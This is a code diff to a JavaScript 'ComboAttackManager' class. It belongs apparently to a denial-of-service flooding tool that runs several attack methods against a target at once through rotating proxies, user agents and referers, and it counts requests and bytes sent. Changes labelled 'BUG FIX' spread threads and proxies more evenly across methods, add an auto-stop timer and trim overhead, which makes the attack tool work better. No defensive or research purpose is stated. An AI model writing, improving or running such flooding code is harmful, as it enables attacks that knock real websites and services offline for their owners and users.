@@ -34,28 +34,52 @@ export class ComboAttackManager {
             logger.info('🔥 Starting COMBO ATTACK!');
             logger.info(`🎯 Target: ${this.target}`);
             logger.info(`⚡ Methods: ${this.methods.join(', ')}`);
-            logger.info(`🧵 Threads per method: ${Math.floor(this.threads / this.methods.length)}`);
+            
+            // BUG FIX: Better thread allocation - distribute remaining threads
+            const baseThreads = Math.floor(this.threads / this.methods.length);
+            const remainingThreads = this.threads % this.methods.length;
+            
+            logger.info(`🧵 Base threads per method: ${baseThreads}`);
+            if (remainingThreads > 0) {
+                logger.info(`🧵 Extra threads distributed: ${remainingThreads}`);
+            }
             logger.info(`⏱️  Duration: ${this.duration}s`);
 
             // Reset counters
             REQUESTS_SENT.reset();
             BYTES_SENT.reset();
 
-            // Calculate threads per method
-            const threadsPerMethod = Math.floor(this.threads / this.methods.length);
+            // BUG FIX: Distribute proxies evenly across methods
+            const proxiesPerMethod = this.proxies && this.proxies.length > 0 
+                ? Math.floor(this.proxies.length / this.methods.length)
+                : 0;
+
+            if (this.proxies && this.proxies.length > 0) {
+                logger.info(`🔄 Proxies per method: ${proxiesPerMethod}`);
+            }
 
             // Create attack manager for each method
-            for (const method of this.methods) {
+            for (let i = 0; i < this.methods.length; i++) {
+                const method = this.methods[i];
                 try {
+                    // BUG FIX: Distribute remaining threads to first methods
+                    const methodThreads = baseThreads + (i < remainingThreads ? 1 : 0);
+                    
+                    // BUG FIX: Distribute proxies evenly
+                    const methodProxies = this.proxies && this.proxies.length > 0
+                        ? this.proxies.slice(i * proxiesPerMethod, (i + 1) * proxiesPerMethod)
+                        : null;
+
                     const attackManager = new AttackManager({
                         target: this.target,
                         method: method,
-                        threads: threadsPerMethod,
+                        threads: methodThreads,
                         duration: this.duration,
                         rpc: this.rpc,
-                        proxies: this.proxies,
+                        proxies: methodProxies,
                         userAgents: this.userAgents,
-                        referers: this.referers
+                        referers: this.referers,
+                        enableMonitoring: false // BUG FIX: Disable monitoring for combo to reduce overhead
                     });
 
                     this.attackManagers.push(attackManager);
@@ -65,7 +89,7 @@ export class ComboAttackManager {
                         logger.error(`Method ${method} error: ${err.message}`);
                     });
 
-                    logger.success(`✅ Launched ${method} attack`);
+                    logger.success(`✅ Launched ${method} with ${methodThreads} threads${methodProxies ? ` and ${methodProxies.length} proxies` : ''}`);
                 } catch (err) {
                     logger.error(`Failed to start ${method}: ${err.message}`);
                 }
@@ -73,6 +97,15 @@ export class ComboAttackManager {
 
             // Start stats monitoring
             this.startStatsMonitoring();
+
+            // BUG FIX: Add auto-stop for combo attack (centralized)
+            this.autoStopTimeout = setTimeout(() => {
+                try {
+                    this.stop();
+                } catch (err) {
+                    logger.error(`Error in combo auto-stop: ${err.message}`);
+                }
+            }, this.duration * 1000);
 
             logger.success(`🚀 COMBO ATTACK LAUNCHED with ${this.methods.length} methods!`);
 
@@ -117,6 +150,16 @@ export class ComboAttackManager {
             this.active = false;
             logger.info('🛑 Stopping COMBO ATTACK...');
 
+            // BUG FIX: Clear auto-stop timeout
+            if (this.autoStopTimeout) {
+                try {
+                    clearTimeout(this.autoStopTimeout);
+                } catch (err) {
+                    logger.debug(`Error clearing auto-stop timeout: ${err.message}`);
+                }
+                this.autoStopTimeout = null;
+            }
+
             // Stop all attack managers
             this.attackManagers.forEach((manager, index) => {
                 try {
@@ -139,6 +182,16 @@ export class ComboAttackManager {
                 this.statsInterval = null;
             }
 
+            // BUG FIX: Force garbage collection if available
+            if (global.gc) {
+                try {
+                    global.gc();
+                    logger.debug('Garbage collection triggered');
+                } catch (e) {
+                    logger.debug('GC not available');
+                }
+            }
+
             logger.success('✅ COMBO ATTACK stopped!');
             logger.info(`📊 Final Stats - Requests: ${this.formatNumber(REQUESTS_SENT.get())} | Data: ${this.formatBytes(BYTES_SENT.get())}`);
 
@@ -150,6 +203,10 @@ export class ComboAttackManager {
             if (this.statsInterval) {
                 clearInterval(this.statsInterval);
                 this.statsInterval = null;
+            }
+            if (this.autoStopTimeout) {
+                clearTimeout(this.autoStopTimeout);
+                this.autoStopTimeout = null;
             }
         }
     }
